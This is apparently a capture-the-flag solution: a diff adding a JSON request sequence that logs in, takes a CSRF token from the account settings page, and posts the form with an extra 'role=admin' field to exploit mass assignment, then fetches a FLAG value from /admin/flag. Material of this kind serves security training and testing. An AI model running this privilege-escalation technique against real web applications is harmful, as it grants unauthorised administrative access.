@@ -1,0 +1,26 @@
+{
+  "steps": [
+    { "name": "log in",
+      "resend": 0, "create": true,
+      "set": ["method=POST", "path=/api/login",
+              "header.Content-Type=application/json",
+              "json.user=${user}", "json.password=${password}"] },
+
+    { "name": "render the form and take its token",
+      "resend": 0, "create": true,
+      "set": ["method=GET", "path=/account/settings"],
+      "extract": { "csrf": "regex:name=\"csrf\" value=\"([^\"]+)\"" } },
+
+    { "name": "save, with one field the form never had",
+      "resend": 0, "create": true,
+      "set": ["method=POST", "path=/account/settings",
+              "header.Content-Type=application/x-www-form-urlencoded",
+              "form.display_name=Guest", "form.csrf=${csrf}",
+              "form.role=admin"] },
+
+    { "name": "collect",
+      "resend": 0, "create": true,
+      "set": ["method=GET", "path=/admin/flag"],
+      "extract": { "flag": "regex:(FLAG\\{[^}]+\\})" } }
+  ]
+}
